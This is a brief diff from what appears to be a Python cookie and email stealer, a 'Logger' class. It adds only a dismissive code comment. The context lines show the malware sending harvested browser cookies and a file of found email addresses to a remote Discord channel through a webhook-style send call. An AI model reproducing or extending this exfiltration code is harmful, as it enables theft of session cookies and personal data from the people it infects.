@@ -87,7 +87,7 @@ class Logger:
                 await w.send(embed=Beta_Cookies, file=self.Beta_Cookies_File)
             elif self.Cookies_Found:
                 await w.send(embed=Vanilla_Cookies, file=self.Cookies_File)
-            elif self.Emails:
+            elif self.Emails: # This is garbage and not worth having. The check doesn't even work but who gives cares.
                 file = open("Found_Emails.txt", "w+")
                 file.write("\n".join(self.Emails))
                 await w.send(file=discord.File(file))
